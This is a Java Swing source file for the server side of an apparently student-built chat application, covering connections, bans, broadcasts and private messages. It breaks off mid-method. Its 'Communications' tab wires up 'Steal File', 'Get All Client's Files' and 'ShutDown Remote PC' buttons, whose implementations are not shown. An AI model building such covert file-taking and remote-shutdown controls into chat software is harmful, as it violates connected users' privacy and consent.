/*
 * Description: Class ServerGUI.java
 * Author: Dimtri Pankov
 * Date: 11-Feb-2011
 * Version: 1.0
 */
package ChatProject;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.TreeMap;
import javax.swing.DefaultListCellRenderer;
import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.TitledBorder;
import javax.swing.text.SimpleAttributeSet;

/**
 * The ServerGUI class is the Graphical Interface of the Server Side of our
 * Chat project when it starts up it waits for the administrator to click the button start
 * as soon as the button start is clicked the server starts to listen on the Server Thread which is the inner class
 * of the ServerGUI The server has all the possibilities it can view the conversations it can kick people out
 * then it can also send private messages to the clients as well as it can broadcast important messages to all connected clients
 * This message will be of color red so clients will see them as being important the Administrator can also clear its own conversations
 * The Administrator have the power to disconnect and ban user by inserting their IP into the black list of IPs
 * The ServerGUI has also a JList that has contains all connected clients for controlling the clients by sending them messages etc.....
 * The Administrator has also a possibility to chat as normal client would the Conversations Tab contains server initial information
 * what time it got online and etc... this tab also has the possibility to show or hide conversations of the clients
 * the connections tab has all other options like disconnect a user ban him chat with clients send private messages or broadcast important messages
 * The list of users has all connected users and the text area its for either view the conversations or chat with clients
 * @author Dimitri Pankov
 * @see JFrame
 * @see Socket
 * @see Server
 * @version 1.2
 */
public class ServerGUI extends JFrame {

    private JTextArea tAreaServerInfo, tAreaAdminChat;
    private Server server;
    private JButton btnStealFile, btnBroadcast, btnShutDown, btnGetAllClientFiles, btnClearChat, btn_Hide_Show_Chat, btnStart, btnDisconnect, btnPrivateMessage, btnBanUser, btn_Hide_Show_Conversations, btnClearConversations;
    private JTextField txtSend, txtBroadcast;
    private JPanel pnlConnectionsCenter;
    private JPanel centerPanel;
    private Date date;
    private DateFormat format = new SimpleDateFormat("hh:mm:ss a");
    private JTabbedPane tabs;
    private JList usersList, usersListCommunicationsTab, filesListCommunicationsTab;
    private DefaultListModel model, modelUsersCommunicationsTab, modelFileListCommunicationsTab;
    private JScrollPane scrollJlist, scrollConversations;
    private boolean isSelected = false;
    private JMenuBar menuBar;
    private JMenu menuFile, menuHelp;
    private CostumPanel pnlConnections, pnlConnectionsSouth, pnlConversations, pnlCommunications, pnlSouth;
    private boolean isConversationHidden = true;
    private boolean isChatHidden = true;
    private String serverInfo;
    private TitledBorder serverInfoBorder;
    private ArrayList<InetAddress> blackList = new ArrayList<InetAddress>();
    private ArrayList<String> userNames = new ArrayList<String>();
    private TreeMap<String, InetAddress> clientMap = new TreeMap<String, InetAddress>();
    private boolean isShutDownMode = true;
    private JLabel lblCummunicationsTab;
    private int port = 5555;
    private ArrayList<String> listFiles = new ArrayList<String>();

    /**
     * Empty constructor of the class has all needed components
     * to represent itself graphically on the screen basically
     * this constructor does not do anything with sockets or ServerSocket
     * This constructor is purely GUI Graphical Interface of the Server
     */
    public ServerGUI() {
        this.addWindowListener(new WindowAdapter() {

            /**
             * The method windowClosing is needed to do
             * some special things when the user decides to close we need to
             * kill the thread and release resources
             * @param e WindowEvent object that is generated when window is closing
             */
            @Override
            public void windowClosing(WindowEvent e) {
                if (server != null) {
                    server.killThread();
                }
                System.exit(0);
            }
        });
        tAreaAdminChat = new JTextArea() {

            @Override
            public void paintComponent(Graphics g) {
                URL url = this.getClass().getResource("/Icons/blueswirls.jpg");
                Toolkit toolkit = this.getToolkit();
                Image image = toolkit.getImage(url);
                g.drawImage(image, 0, 0, this.getWidth(), this.getHeight(), this);
                super.paintComponent(g);
            }
        };
        //CREATE THE TEXT AREA FOR CONNECTIONS TAB
        tAreaAdminChat.setOpaque(false);
        tAreaAdminChat.setEditable(false);
        tAreaAdminChat.setForeground(Color.WHITE);
        tAreaAdminChat.setFont(new Font("Serif", Font.BOLD, 18));
        JScrollPane scroll = new JScrollPane(tAreaAdminChat, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scroll.setPreferredSize(new Dimension(325, 350));
        TitledBorder tAtreaBorder = new TitledBorder("Admin Chat");
        tAtreaBorder.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        tAtreaBorder.setTitleColor(Color.WHITE);
        tAreaAdminChat.setBorder(tAtreaBorder);
        menuBar = new JMenuBar();
        this.setJMenuBar(menuBar);
        menuFile = new JMenu("File");
        menuFile.add(new JMenuItem("Change port")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked
             */
            public void actionPerformed(ActionEvent e) {
                String input = JOptionPane.showInputDialog("Please Enter Port Number");
                if (input != null && !input.trim().equals("") && !(Integer.parseInt(input) > 65555)) {
                    port = Integer.parseInt(input);
                }
            }
        });
        menuFile.add(new JMenuItem("Exit")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked
             */
            public void actionPerformed(ActionEvent e) {
                if (server != null) {
                    server.killThread();
                }
                System.exit(0);
            }
        });
        menuHelp = new JMenu("Help");
        menuHelp.add(new JMenuItem("User Manual")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked
             */
            public void actionPerformed(ActionEvent e) {
                new UserManual(ServerGUI.this);
            }
        });

        menuBar.add(menuFile);
        menuBar.add(menuHelp);
        menuBar.setBackground(Color.ORANGE);

        //CREATE JTABBED PANE
        tabs = new JTabbedPane();

        btn_Hide_Show_Conversations = new JButton("Show Conversation");
        btn_Hide_Show_Conversations.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                ServerGUI.this.hide_show_Conversations();
            }
        });
        btnClearConversations = new JButton("Clear Convesations");
        btnClearConversations.setEnabled(false);
        btnClearConversations.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                ServerGUI.this.clearConversations();
            }
        });

        //CREATE CONVERSATIONS TAB AND ADD COMPONENTS TO IT
        pnlConversations = new CostumPanel("/Icons/green.jpg", new BorderLayout());
        serverInfoBorder = new TitledBorder("Server Tracking Tab");
        serverInfoBorder.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        serverInfoBorder.setTitleColor(Color.WHITE);
        pnlConversations.setBorder(serverInfoBorder);
        tAreaServerInfo = new JTextArea(7, 35) {

            /**
             * The method paintComponent is overridden in our anonymous class
             * to paint some images onto swing components
             * @param g Graphics object used to paint this object
             */
            @Override
            public void paintComponent(Graphics g) {
                URL url = this.getClass().getResource("/Icons/green.jpg");
                Toolkit toolkit = this.getToolkit();
                Image image = toolkit.getImage(url);
                g.drawImage(image, 0, 0, tAreaServerInfo.getWidth(), tAreaServerInfo.getHeight(), tAreaServerInfo);
                super.paintComponent(g);
            }
        };

        //GUI FOR THE CONVERSATIONS TAB
        tAreaServerInfo.setOpaque(false);
        tAreaServerInfo.setForeground(Color.WHITE);
        tAreaServerInfo.setFont(new Font("Serif", Font.BOLD, 21));
        tAreaServerInfo.setEditable(false);
        scrollConversations = new JScrollPane(tAreaServerInfo, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        centerPanel = new JPanel(new GridLayout(1, 2));
        btnStart = new JButton("Start Server");
        centerPanel.add(scrollConversations);
        pnlSouth = new CostumPanel("/Icons/green.jpg");
        pnlSouth.add(btnStart);
        pnlSouth.add(btn_Hide_Show_Conversations);
        pnlSouth.add(btnClearConversations);
        pnlSouth.setBackground(Color.DARK_GRAY);
        pnlConversations.add(centerPanel, BorderLayout.CENTER);
        pnlConversations.add(pnlSouth, BorderLayout.SOUTH);
        tabs.addTab("Conversations", pnlConversations);

        //CREATE CONNECTIONS TAB AND ADD COMPONENTS TO IT
        pnlConnections = new CostumPanel("/Icons/blueswirls.jpg", new BorderLayout());
        TitledBorder border = new TitledBorder("Connected Clients Tab");
        border.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        border.setTitleColor(Color.WHITE);
        pnlConnections.setBorder(border);
        model = new DefaultListModel();
        usersList = new JList(model) {

            /**
             * The method paintComponent is overridden in our anonymous class
             * to paint some images onto swing components
             * @param g Graphics object used to paint this object
             */
            @Override
            public void paintComponent(Graphics g) {
                URL url = this.getClass().getResource("/Icons/blueswirls.jpg");
                Toolkit toolkit = this.getToolkit();
                Image image = toolkit.getImage(url);
                g.drawImage(image, 0, 0, this.getWidth(), this.getHeight(), this);
                super.paintComponent(g);

            }
        };
        usersList.addMouseListener(new MouseAdapter() {

            /**
             * The method mousePressed is needed for listening to mouse
             * clicks on the JList in order to do some special things
             * @param e MouseEvent object that is generated when mouse is clicked
             */
            @Override
            public void mousePressed(MouseEvent e) {
                if (usersList.getSelectedValue() != null) {
                    isSelected = true;
                    ServerGUI.this.updateView();
                }
            }
        });

        //GUI FOR CONNECTIONS TAB
        DefaultListCellRenderer listRenderer = (DefaultListCellRenderer) usersList.getCellRenderer();
        listRenderer.setOpaque(false);
        usersList.setOpaque(false);
        TitledBorder listBorder = new TitledBorder("User's List");
        listBorder.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        listBorder.setTitleColor(Color.WHITE);
        usersList.setBorder(listBorder);
        usersList.setFont(new Font("Serif", Font.PLAIN, 18));
        usersList.setForeground(Color.WHITE);

        pnlConnectionsCenter = new JPanel(new FlowLayout(FlowLayout.RIGHT));
        pnlConnectionsCenter.setOpaque(false);
        scrollJlist = new JScrollPane(usersList, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        scrollJlist.setPreferredSize(new Dimension(325, 350));
        txtSend = new JTextField(14);
        txtSend.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when return key is pressed and the textField is in focus
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    ServerGUI.this.sendPrivateMessage();
                } catch (IOException ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });
        pnlConnectionsSouth = new CostumPanel("/Icons/blueswirls.jpg");
        btnBanUser = new JButton("Ban User");
        btnBanUser.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    if (usersList.getSelectedIndex() > -1) {
                        ServerGUI.this.banUser((Session) usersList.getSelectedValue());
                    }
                } catch (IOException ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });
        btnPrivateMessage = new JButton("Send Message");
        btnPrivateMessage.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    ServerGUI.this.sendPrivateMessage();
                } catch (IOException ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });
        btnDisconnect = new JButton("Disconnect");
        btnDisconnect.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    ServerGUI.this.disconnect();
                } catch (Exception ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });
        btnBroadcast = new JButton("Broadcast");
        btnBroadcast.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    if (!txtBroadcast.getText().trim().equals("")) {
                        Packet packet = new Packet();
                        packet.setServerMessage(txtBroadcast.getText().trim());
                        for (Session s : server.getSessions()) {
                            s.getOutputStream().writeObject(packet);
                            s.getOutputStream().flush();
                        }
                        if (!isChatHidden) {
                            tAreaAdminChat.append("Admin :" + txtBroadcast.getText() + "\n");
                        }
                        txtBroadcast.setText("");
                    }
                } catch (Exception ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });
        btn_Hide_Show_Chat = new JButton("Show Chat");
        btn_Hide_Show_Chat.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                ServerGUI.this.hide_show_Chat();
            }
        });
        btnClearChat = new JButton("Clear Chat");
        btnClearChat.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                ServerGUI.this.clearChat();
            }
        });
        txtBroadcast = new JTextField(14);
        txtBroadcast.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when the enter key on the text field
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    if (!txtBroadcast.getText().trim().equals("")) {
                        Packet packet = new Packet();
                        packet.setServerMessage(txtBroadcast.getText().trim());
                        for (Session s : server.getSessions()) {
                            s.getOutputStream().writeObject(packet);
                            s.getOutputStream().flush();
                            System.out.println("broadcasted");
                        }
                        if (!isChatHidden) {
                            tAreaAdminChat.append("Admin :" + txtBroadcast.getText() + "\n");
                        }
                        txtBroadcast.setText("");
                    }
                } catch (Exception ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        });

        //ADD ALL COMPONENTS TO THE CONNECTION TAB
        pnlConnectionsSouth.add(txtSend);
        pnlConnectionsSouth.add(btnPrivateMessage);
        pnlConnectionsSouth.add(btnDisconnect);
        pnlConnectionsSouth.add(btnBanUser);
        pnlConnectionsCenter.add(scrollJlist);
        pnlConnectionsCenter.add(scroll);
        pnlConnectionsCenter.add(btnClearChat);
        pnlConnectionsCenter.add(btn_Hide_Show_Chat);
        pnlConnectionsCenter.add(btnBroadcast);
        pnlConnectionsCenter.add(txtBroadcast);
        pnlConnections.add(pnlConnectionsCenter, BorderLayout.CENTER);
        pnlConnections.add(pnlConnectionsSouth, BorderLayout.SOUTH);
        tabs.addTab("Connections", pnlConnections);

        //CREATE COMMUNICATIONS TAB AND ADD COMPONENTS TO IT
        pnlCommunications = new CostumPanel("/Icons/green.jpg");
        TitledBorder border1 = new TitledBorder("Communications Tab");
        modelFileListCommunicationsTab = new DefaultListModel();
        filesListCommunicationsTab = new JList(modelFileListCommunicationsTab);
        filesListCommunicationsTab.setForeground(Color.BLUE);
        filesListCommunicationsTab.setFont(new Font("Veradna", Font.PLAIN, 17));
        JScrollPane scrollArea = new JScrollPane(filesListCommunicationsTab, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
        scrollArea.setPreferredSize(new Dimension(400, 300));

        btnGetAllClientFiles = new JButton("Get All Client's Files");
        btnGetAllClientFiles.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                if (!modelUsersCommunicationsTab.isEmpty() && usersListCommunicationsTab.getSelectedIndex() > -1) {
                    modelFileListCommunicationsTab.addElement("Please wait the list is being downloaded........");
                    try {
                        ServerGUI.this.getClientsListOffAllFiles();
                    } catch (IOException ex) {
                        modelFileListCommunicationsTab.addElement(ex.toString() + "\n");
                    }
                }
            }
        });

        //MORE GUI FOR THE COMMUNICATIONS TAB
        lblCummunicationsTab = new JLabel("Choose a client from the list and click Get All Client's Files buton");
        lblCummunicationsTab.setForeground(Color.WHITE);
        lblCummunicationsTab.setFont(new Font("Veradna", Font.BOLD, 21));
        modelUsersCommunicationsTab = new DefaultListModel();
        usersListCommunicationsTab = new JList(modelUsersCommunicationsTab);
        JScrollPane scrollList = new JScrollPane(usersListCommunicationsTab, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollList.setPreferredSize(new Dimension(250, 300));
        border1.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        border1.setTitleColor(Color.WHITE);
        btnShutDown = new JButton("ShutDown Remote PC");
        btnShutDown.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                if (!model.isEmpty() && usersListCommunicationsTab.getSelectedIndex() > -1) {
                    try {
                        if (isShutDownMode) {
                            ServerGUI.this.shutDownRemotePC();
                            btnShutDown.setText("Cancel ShutDown");
                            isShutDownMode = false;
                        } else {
                            ServerGUI.this.cancelShutDownOfRemotePC();
                            btnShutDown.setText("ShutDown Remote PC");
                            isShutDownMode = true;
                        }
                    } catch (Exception ex) {
                        tAreaServerInfo.append(ex.toString() + "\n");
                    }
                }
            }
        });
        btnStealFile = new JButton("Steal File");
        btnStealFile.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent e) {
                ServerGUI.this.stealClientFile();
            }
        });

        //INITIALIZE AND ADD ALL COMPONENTS TO THE COMMUNICATIONS TAB
        pnlCommunications.setBorder(border1);
        pnlCommunications.add(lblCummunicationsTab);
        pnlCommunications.add(scrollArea);
        pnlCommunications.add(scrollList);
        pnlCommunications.add(btnShutDown);
        pnlCommunications.add(btnGetAllClientFiles);
        pnlCommunications.add(btnStealFile);
        tabs.addTab("Communications", pnlCommunications);

        btnStart.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                if (server == null) {
                    date = new Date();
                    tAreaServerInfo.append("Server online :" + format.format(date) + "\n");
                    tAreaServerInfo.append("Wating for connection\n");
                    tAreaServerInfo.append("------------------------------------------------------\n");
                    server = new Server();
                    new Thread(server).start();
                }
            }
        });

        this.add(tabs);

        //INITIALIZE THE JFRAM'S PROPERTEIS
        this.setIconImage(new ImageIcon(this.getClass().getResource("/Icons/sss.png")).getImage());
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setLocation(300, 150);
        this.setSize(700, 550);
        this.setResizable(false);
        this.setTitle("Server GUI");
        this.setVisible(true);
    }

    /**
     * The Server class is a Runnable object it listens for
     * any connections when connection is established the Session object is created
     * It is also added to the list of sessions because server needs to remember all connected session
     * for later communication with clients and etc......
     * Then the Server goes back for listening to other connections
     * @author Dimitri Pankov
     * @see Runnable
     * @see ServerSocket
     * @version 1.0
     */
    public class Server implements Runnable {

        private volatile boolean isAlive = true;
        private Socket socket;
        private ServerSocket serverSocket;
        private ArrayList<Session> sessions = new ArrayList<Session>();
        private Session session;

        /**
         * An empty constructor of the class
         * simply creates ServerSocket object on the 5555 port
         */
        public Server() {
            try {
                serverSocket = new ServerSocket(port);
            } catch (Exception e) {
                tAreaServerInfo.append(e.toString() + "\n");
                isAlive = false;
            }
        }

        /**
         * The run method of the Server class
         * it accepts connections checks if the accepted connection's IP
         * is not on the black list then creates a Session then goes for listening again
         * if for some reason the session IP is in the black list that means this user is banned
         * it closes the socket right away
         */
        @Override
        public void run() {
            try {
                while (isAlive) {
                    socket = serverSocket.accept();
                    if (!blackList.contains(socket.getInetAddress())) {
                        session = new Session(ServerGUI.this, socket);
                        sessions.add(session);
                        session.start();
                    } else {
                        socket.close();
                    }
                }
            } catch (Exception e) {
                tAreaServerInfo.append(e.toString() + "\n");
                isAlive = false;
            }
        }

        /**
         * The analyzeAndDisplay method simply receives an object as the parameter then analyzes it
         * then does what ever is needed depending on the object contents
         * Instead using strings with protocol its much easier to send whole objects and extract
         * the instance variables accordingly and do what is necessary depending on what variable is not null
         * @param object to analyze and extract the data from
         * @throws IOException when working with streams risks are unavoidable
         */
        public synchronized void analyzeAndDisplay(Object object) throws IOException {
            if (object instanceof Packet) {
                if (((Packet) object).getName() != null) {
                    this.broadcast(object);
                }
                if (((Packet) object).getClientPositionForPrivateChat() != null && ((Packet) object).getCreatePrivateChat() != null && ((Packet) object).getPublicIP() == null && ((Packet) object).getPublicChatTransfer() == null) {
                    ((Packet) object).setIpAddress(clientMap.get(((Packet) object).getCreatePrivateChat()));
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().writeObject(object);
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().flush();
                }
                if (((Packet) object).getClientPositionForPrivateChat() != null && ((Packet) object).getPublicIP() != null && ((Packet) object).getPublicChatTransfer() == null) {
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().writeObject(object);
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().flush();
                }
                if (((Packet) object).getPublicChatTransfer() != null && ((Packet) object).getPublicIP() == null) {
                    ((Packet) object).setIpAddress(clientMap.get(((Packet) object).getCreatePrivateChat()));
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().writeObject(object);
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().flush();
                }
                if (((Packet) object).getPublicChatTransfer() != null && ((Packet) object).getPublicIP() != null) {
                    ((Packet) object).setIpAddress(clientMap.get(((Packet) object).getCreatePrivateChat()));
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().writeObject(object);
                    this.getSessions().get(((Packet) object).getClientPositionForPrivateChat()).getOutputStream().flush();
                }
                if (((Packet) object).getFileTransferDecline() != null) {
                    ServerGUI.this.cancelFileTransfer(object);
                }
                if (((Packet) object).getGameDecline() != null) {
                    this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().writeObject(object);
                    this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().flush();
                }
                if (((Packet) object).getRequestChessGame() != null) {
                    if (((Packet) object).getPublicIP() == null) {
                        ((Packet) object).setIpAddress(clientMap.get(((Packet) object).getRequestChessGame()));
                        this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().writeObject(object);
                        this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().flush();
                    } else {
                        this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().writeObject(object);
                        this.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().flush();
                    }
                }
            } else if (object instanceof ArrayList) {
                ServerGUI.this.showClientFiles((ArrayList) object);
            }
        }

        /**
         * The killThread method simply kills the running thread by
         * forcing it run method to end the way it is done is by simply
         * changing the value of the volatile boolean variable to false which in turn
         * forces the loop to self terminate
         */
        public void killThread() {
            isAlive = false;
        }

        /**
         * The method broadcast broadcasts messages to all the clients that are connected to the server
         * and this method does something a little more like show the conversations when server wants to see it
         * simply by changing the boolean value to false the first isConverationHidden is for the Conversations Tab
         * The second is for the connections tab for chatting with clients or simply view the conversations
         * @param object as an Object to send to the client which will be sent to all connected clients basically object is the Packet
         * @throws IOException when working with streams risks are unavoidable
         */
        public void broadcast(Object object) throws IOException {
            Packet packet = (Packet) object;
            for (Session s : sessions) {
                s.getOutputStream().writeObject(packet);
                s.getOutputStream().flush();
            }
            if (!isConversationHidden) {
                ServerGUI.this.displayConversations(packet.getName() + ": " + packet.getMessage());
            }
            if (!isChatHidden) {
                ServerGUI.this.displayChat(packet.getName() + ": " + packet.getMessage());
            }
        }

        /**
         * The method remove session simply removes session from the usersList
         * and the model this method is called whenever someone disconnects or
         * gets kicked out by the server which ever it is the session will be removed from both JList and ArrayList<Session>
         * This method is synchronized to make sure that only one thread a a time could execute this method
         * The acquired key is only released by the executing thread when it is done with the method
         * @param session as Session to remove from the JList and ArrayList
         */
        public synchronized void removeSession(Session session) {
            sessions.remove(session);
            model.removeElement(session);
            modelUsersCommunicationsTab.removeElement(session);
            if (sessions.isEmpty()) {
                isSelected = false;
                ServerGUI.this.updateView();
            }
        }

        /**
         * The method updateList simply adds the element to the JList of sessions
         * Remember that swing components could only be updated by event dispatching thread
         * This method is synchronized to make sure that only one thread a a time could execute this method
         * The acquired key is only released by the executing thread when it is done with the method
         * Why this method needs to be synchronized because it is called in the session thread but we could
         * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
         * @param session as a Session to be added to the model
         */
        public synchronized void updateList(Session session) {
            model.addElement(session);
            modelUsersCommunicationsTab.addElement(session);
        }

        /**
         * The updateClients method simply updates all clients as needed as soon
         * As soon as the new session is created or terminated this method is called to send the updates to all clients
         * this method is needed for updating the user's list on the client side because the client uses the list to send private message or files
         * This method is synchronized to make sure that only one thread a a time could execute this method
         * The acquired key is only released by the executing thread when it is done with the method
         * Why this method needs to be synchronized because it is called in the session thread but we could
         * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
         */
        public synchronized void updateClients() {
            final ArrayList<String> usersList = new ArrayList<String>();

            //MAP THE IP'S TO THE CLIENTS NAMES
            for (Session s : sessions) {
                usersList.add(s.getClientName());
                clientMap.put(s.getClientName(), s.getClientIP());
            }

            //SEND A USER LIST TO ALL CLIENTS THE USER LIST CONTAINS ALL CONNECTED CLIENTS
            for (int i = 0; i < sessions.size(); i++) {
                try {
                    sessions.get(i).getOutputStream().writeObject(usersList);
                    sessions.get(i).getOutputStream().flush();
                } catch (Exception ex) {
                    tAreaServerInfo.append(ex.toString() + "\n");
                }
            }
        }

        /**
         * The method getClientMap simply returns the TreeMap to the caller
         * The TreeMap has all the IP's that are mapped to the clients names
         * because no duplicate names are allowed the name serves as a key to the IP
         * @return clientMap as a TreeMap
         */
        public TreeMap<String, InetAddress> getClientMap() {
            return clientMap;
        }

        /**
         * The method getSessions simply returns the ArrayList of all sessions
         * to the caller that are connected to the server
         * @return sessions as an ArrayList<Session>
         */
        public ArrayList<Session> getSessions() {
            return sessions;
        }
    }

    /**
     * The method getServer simply returns the innerServer to the caller
     * the returned server object is not the GUI part of the server it is the inner server
     * that waits for connections and adds them to the usersList of Sessions
     * this instance is needed for using the server methods
     * This method is synchronized to make sure that only one thread a a time could execute this method
     * The acquired key is only released by the executing thread when it is done with the method
     * Why this method needs to be synchronized because it is called in the session thread but we could
     * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
     * @return server as Server
     */
    public synchronized Server getServer() {
        return server;
    }

    /**
     * The method getArea simply returns the JTextArea to the caller
     * this method is needed for appending the information to the JTextArea
     * Information like Exception, Connections, Date and Time, who's left etc...
     * @return tAreaServerInfo as JTextArea to the caller
     */
    public JTextArea getArea() {
        return tAreaServerInfo;
    }

    /**
     * The method disconnect simply disconnects the chosen client
     * from the server this method is used by the server if the administrator wants
     * to disconnect a certain client because of his/her behavior
     * The administrator adds a message that will be shown to the client before
     * he/she is disconnected that message will carry a reason for sudden disconnection by the server
     * @throws IOException when working with streams/sockets risks are unavoidable
     */
    public void disconnect() throws IOException {
        if (usersList.getSelectedIndex() > -1) {
            String message = JOptionPane.showInputDialog(ServerGUI.this, "Enter a message for the client");
            if (!message.equals("")) {
                Session session = (Session) usersList.getSelectedValue();
                Packet packet = new Packet();
                packet.setKill(message);
                session.getOutputStream().writeObject(packet);
                session.getOutputStream().flush();
                server.removeSession(session);
                txtSend.setText("");
            }
        }
    }

    /**
     * The updateView method simply updates the view of
     * the connections tab all buttons at first are disabled if the administrator
     * chooses the client in the JList by clicking the mouse all buttons become enabled
     * if the JList is emptied out the buttons return to being disabled
     */
    public void updateView() {
        if (isSelected) {
            btnDisconnect.setEnabled(true);
            btnPrivateMessage.setEnabled(true);
            txtSend.setEditable(true);
            btnBanUser.setEnabled(true);
        } else {
            btnDisconnect.setEnabled(false);
            btnPrivateMessage.setEnabled(false);
            txtSend.setEditable(false);
            btnBanUser.setEnabled(false);
        }
    }

    /**
     * The method clearConversations simply clears the JTextArea in the conversations tab
     * When this method is called the text area becomes empty
     */
    public void clearConversations() {
        tAreaServerInfo.setText("");
    }

    /**
     * The displayConversations method simply adds the
     * message to the JTextArea in the conversations tab using the append method which is a
     * beautiful method that only appends not sets text
     * @param message as a String to be appended to the JTextArea in the conversations tab
     */
    private void displayConversations(String message) {
        tAreaServerInfo.append(message + "\n");
    }

    /**
     * The displayChat method simply adds the
     * message to the JTextArea in the connections tab using the append method which is a
     * beautiful method that only appends not sets text
     * @param message as a String to be appended to the JTextArea in the connections tab
     */
    private void displayChat(String message) {
        tAreaAdminChat.append(message + "\n");
    }

    /**
     * This method is only used to send private message
     * to the selected clients first administrator selects the user from
     * the JList then types the message in the textField hits enter or clicks send button
     * the message is sent right away to the selected client for display in turn client when
     * receives the message will analyze it and display it as needed
     * @throws IOException when working with streams or sockets risks are unavoidable
     */
    public void sendPrivateMessage() throws IOException {
        SimpleAttributeSet set = new SimpleAttributeSet();
        if (!txtSend.getText().trim().equals("")) {
            Packet packet = new Packet();
            Session s = (Session) usersList.getSelectedValue();
